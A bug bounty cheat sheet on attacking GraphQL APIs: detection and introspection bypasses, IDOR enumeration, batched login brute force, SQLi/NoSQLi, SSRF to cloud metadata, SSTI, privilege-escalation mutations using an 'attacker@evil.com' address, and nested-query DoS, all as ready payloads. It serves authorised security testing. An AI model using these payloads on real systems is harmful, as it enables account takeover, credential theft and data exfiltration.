---
tags: [bugbounty, vuln/graphql, cheatsheet, p1, p2, p3, 2025]
aliases: [GraphQL, GraphQL Security]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# GraphQL Security

> [!tldr] Hunter Summary
> **What:** GraphQL endpoints with introspection, IDOR via type IDs, batching abuse, injection in args.
> **Impact:** Mass data exfil via batching, auth bypass, IDOR, SQLi/NoSQLi in resolvers.
> **Best targets:** Any app with `/graphql`, `/api/graphql`, `/v1/graphql` endpoints.
> **Time to triage:** Run introspection query → map schema → test auth on fields → 20 min.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Endpoints | `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql` |
| Headers | `Content-Type: application/json` with `{"query": "..."}` body |
| GET requests | `/graphql?query={user{id,email}}` |
| IDE exposed | `/graphiql`, `/altair`, `/playground`, `/__graphql` |
| Websocket | `ws://target.com/subscriptions` |

---

## Step-by-Step Hunt

### Step 1 — Detect and fingerprint
```bash
# Quick test
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'
# Response with "data": {"__typename": "Query"} = confirmed

# Or GET
curl "https://target.com/graphql?query={__typename}"
```

### Step 2 — Run introspection
```bash
# Full introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'

# Or use graphql-voyager for visual schema
# Or InQL Burp extension — auto-extracts schema

# Bypass introspection disabled:
{ __schema\n{ types { name } } }   # newline bypass
{"query": "query{\n__schema{types{name}}}"}

# Alternative: try __type on specific types you guess
{ __type(name: "User") { fields { name type { name } } } }
```

### Step 3 — Map all queries and mutations
Look for mutations that change state:
```graphql
mutation {
  updateEmail(userId: 1, email: "attacker@evil.com") { success }
  deleteAccount(id: 2) { success }
  changeRole(userId: 3, role: ADMIN) { success }
}
```

### Step 4 — Test IDOR via type IDs
```graphql
# Enumerate users
query { user(id: 1) { id email username role } }
query { user(id: 2) { id email username role } }

# If UUIDs, try to find them via other queries
query { posts { author { id email } } }

# Batch IDOR via aliases
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
  ... (up to 100)
}
```

### Step 5 — Test batching for rate limit bypass
```json
// Batch query (array of operations)
[
  {"query": "mutation { login(email: \"admin@target.com\", password: \"password1\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"password2\") { token } }"},
  ...
]
// 1 HTTP request = N login attempts = bypass rate limiting
```

### Step 6 — Injection in arguments
```graphql
# SQLi in GraphQL arg
{ users(filter: "name='a' OR 1=1-- ") { id email } }

# NoSQLi
{ users(filter: "{\"$gt\": \"\"}") { id email } }

# SSRF via URL argument
{ preview(url: "http://169.254.169.254/latest/meta-data/") { content } }

# SSTI via template arg
{ render(template: "{{7*7}}") { output } }
```

### Step 7 — Authorization testing
```graphql
# Test if unauthenticated queries return data
# Remove Authorization header, retry queries

# Test if non-admin can run admin mutations
mutation { 
  createUser(role: ADMIN, email: "hax@evil.com") { id }
}

# Test field-level authorization
query {
  user(id: 1) { 
    email    # ok?
    password # should fail
    apiKey   # should fail  
    twoFactorSecret # should fail
  }
}
```

### Step 8 — Denial of Service (batching + nested)
```graphql
# Nested query DoS (if depth not limited)
{ user { posts { author { posts { author { posts { author { id } } } } } } } }

# Alias batching DoS
{ u1:user(id:1) { id } u2:user(id:1) { id } ... (10000x) }
```

---

## 2025-2026 Updates

> [!info] GraphQL surface (2025-2026)
> - **Persisted queries bypass:** Apps using APQ still expose full query endpoint; try both `documentId` and `query` params
> - **Subscription IDOR:** GraphQL subscriptions often have weaker auth than queries — subscribe to other users' events
> - **Federation poisoning:** Multi-service GraphQL federation — one weak subgraph exposes full schema
> - **Field suggestion attacks:** GraphQL returns field suggestions on typo — disables introspection but leaks schema
> - **Upload mutations:** `multipart/form-data` GraphQL uploads often skip file type validation

---

## Chain Ideas

| GraphQL bug → | Result |
|---------------|--------|
| Introspection + mutation | → Find privileged mutations → exploit |
| Batching | → Rate limit bypass → brute force |
| IDOR via ID | → Mass user data exfil |
| SQLi in args | → Database dump |
| SSRF via URL arg | → Cloud metadata → credentials |

---

## Tools

| Tool | Use |
|------|-----|
| `InQL` | Burp extension — schema extraction, query generation |
| `graphql-voyager` | Visual schema explorer |
| `clairvoyance` | Wordlist-based schema recovery when introspection disabled |
| `graphw00f` | GraphQL engine fingerprinting |
| `batchql` | Batch query automation |

---

## References

- PortSwigger GraphQL — https://portswigger.net/web-security/graphql
- HackTricks GraphQL — https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- PayloadsAllTheThings GraphQL — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
